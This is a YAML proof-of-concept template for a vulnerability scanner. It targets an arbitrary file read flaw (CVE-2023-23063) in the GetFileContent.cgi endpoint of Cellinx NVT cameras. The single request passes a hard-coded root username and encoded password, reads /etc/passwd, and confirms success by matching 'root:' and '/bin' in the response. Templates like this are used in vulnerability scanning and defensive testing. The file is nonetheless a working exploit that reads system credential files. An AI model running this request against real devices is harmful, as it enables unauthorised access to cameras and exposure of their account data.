id: poc-yaml-cellinx-nvt-getfilecontent-cgi-anyfile-read
info:
  name: Cellinx NVT 摄像机 GetFileContent.cgi任意文件读取漏洞 (CVE-2023-23063)
  severity: high
  tags:
  - 文件读取
  - CVE-2023-23063
  finger: nvt_web_server
requests:
- method: GET
  path: /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd
  expression: 'status_code == 200

    && contains(body,"root:")

    && contains(body,"/bin")

    && !contains(body,"<")

    '
variables: {}
transport: http
